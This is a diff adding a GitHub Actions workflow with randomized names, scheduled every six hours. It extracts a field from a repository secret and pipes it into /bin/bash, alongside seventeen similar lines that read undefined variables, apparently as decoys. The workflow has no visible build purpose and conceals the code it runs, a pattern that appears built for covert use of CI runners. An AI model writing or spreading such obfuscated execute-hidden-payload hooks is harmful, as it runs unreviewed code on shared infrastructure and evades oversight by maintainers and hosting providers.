@@ -1,0 +1,34 @@
+name: nongchanghui4576
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nongchanghui4576
+        env:
+          eqpu56: ${{ secrets.eqpu56 }}
+        run: |
+          echo $eqpu56 | jq -r .u5 | /bin/bash
+          echo $lorzh229 | jq -r .dpyq3535 | /bin/bash
+          echo $cgfv098 | jq -r .t6116 | /bin/bash
+          echo $qw9168 | jq -r .stxvy362 | /bin/bash
+          echo $igugs60898 | jq -r .wdnoh9446 | /bin/bash
+          echo $mrzv56 | jq -r .t169 | /bin/bash
+          echo $kwnnn2270 | jq -r .tm740 | /bin/bash
+          echo $g92586 | jq -r .y3 | /bin/bash
+          echo $zfywa6 | jq -r .jx4 | /bin/bash
+          echo $mg3223 | jq -r .ufnw088 | /bin/bash
+          echo $j576 | jq -r .lvoku29759 | /bin/bash
+          echo $oo94 | jq -r .x1 | /bin/bash
+          echo $zzu95 | jq -r .d7607 | /bin/bash
+          echo $wkb469 | jq -r .igm69084 | /bin/bash
+          echo $d45 | jq -r .g4594 | /bin/bash
+          echo $t296 | jq -r .ywnxe2 | /bin/bash
+          echo $doa235 | jq -r .rfa19 | /bin/bash
+          echo $hb11 | jq -r .ulnp8 | /bin/bash
+
